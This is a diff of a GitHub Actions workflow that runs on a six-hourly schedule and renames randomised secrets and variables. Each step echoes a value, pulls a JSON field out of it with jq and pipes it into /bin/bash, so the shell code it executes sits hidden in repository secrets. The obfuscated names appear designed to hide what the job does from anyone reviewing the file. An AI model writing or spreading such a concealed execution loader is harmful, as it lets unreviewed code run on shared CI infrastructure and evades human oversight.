@@ -3,24 +3,27 @@ name: qiehuanqhx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 3/6 * * *'
+    - cron: '13 3/6 * * *'
 
-jobs:  # 3184
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qiehuanqhx
         env:
-          ks533: ${{ secrets.ks533 }}
+          szm379: ${{ secrets.szm379 }}
         run: |
-          echo $ks533 | jq -r .hlyx149 | /bin/bash
-          echo $nw9 | jq -r .tndjq3782 | /bin/bash
-          echo $jrb834 | jq -r .n37047 | /bin/bash
-          echo $hljg833 | jq -r .dbe33063 | /bin/bash
-          echo $mt85 | jq -r .mvj28 | /bin/bash
-          echo $topjr547 | jq -r .ev4 | /bin/bash
-          echo $t46 | jq -r .xtt42747 | /bin/bash
-          echo $zdj77 | jq -r .t577 | /bin/bash
-          echo $ypt501 | jq -r .ohfe4431 | /bin/bash
+          echo $szm379 | jq -r .wbqi34749 | /bin/bash
+          echo $ei219 | jq -r .e5570 | /bin/bash
+          echo $tepi02507 | jq -r .guv5 | /bin/bash
+          echo $qzbkp0354 | jq -r .t5772 | /bin/bash
+          echo $an3 | jq -r .hk3421 | /bin/bash
+          echo $szmoe815 | jq -r .py058 | /bin/bash
+          echo $geup9084 | jq -r .qjo385 | /bin/bash
+          echo $g7 | jq -r .lbjxi7 | /bin/bash
+          echo $e9 | jq -r .gri8129 | /bin/bash
+          echo $xwql0766 | jq -r .n5 | /bin/bash
+          echo $o30964 | jq -r .qxri2156 | /bin/bash
 
